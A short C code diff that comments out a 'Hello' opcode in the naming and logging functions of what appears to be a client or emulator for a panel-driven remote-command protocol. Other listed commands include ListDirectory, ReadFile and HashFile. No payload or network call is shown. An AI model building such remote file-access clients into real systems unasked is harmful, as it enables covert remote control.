@@ -29,7 +29,7 @@ const char *ws_buffer_type_name(WINHTTP_WEB_SOCKET_BUFFER_TYPE type)
 const char *command_name(unsigned char opcode)
 {
     switch (opcode) {
-    case CMD_HELLO:            return "Hello";
+    //case CMD_HELLO:            return "Hello";
     case CMD_LIST_DIRECTORY:   return "ListDirectory";
     case CMD_READ_FILE:        return "ReadFile";
     case CMD_HASH_FILE:        return "HashFile";
@@ -187,8 +187,8 @@ void print_command(int index, const incoming_message *msg)
     }
     LOG_INFO("\"\n");
 
-    if (opcode == CMD_HELLO)
-        LOG_INFO("[+] panel asks: who are you? (Hello)\n");
+    // if (opcode == CMD_HELLO)
+    //     LOG_INFO("[+] panel asks: who are you? (Hello)\n");
 }
 
 /* Print the outgoing identity frame field by field (the mirror of
